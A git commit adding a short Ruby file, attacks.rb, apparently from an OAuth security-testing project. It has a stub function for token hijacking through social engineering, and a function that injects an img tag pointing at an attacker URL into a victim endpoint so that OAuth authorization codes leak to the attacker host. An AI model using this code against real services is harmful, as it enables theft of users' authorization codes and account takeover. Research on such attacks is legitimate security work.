965dc50fa2fa05587f62c91ed44db62881cfbeab
Nich Ramsey <nich-1@matasano.com>
2015-05-15 11:27:27 -0700

    Added ruby files for proxy and oauth attacks

---
+++ noauth-rb/attacks.rb
@@ -0,0 +1,13 @@
+#!/usr/bin/env ruby
+
+require 'curb'
+
+def hijack_token(data)
+  # Uses primed oauth code & social engineering to
+  # trick user into authorizing to application.
+end
+
+def hijack_leaky_auth_code(victim_url, attacker_url)
+  venom = Curl::Easy.new(victim_url)
+  venom.http_post("leaky=" + "<img src='#{attacker_url}'>")
+end
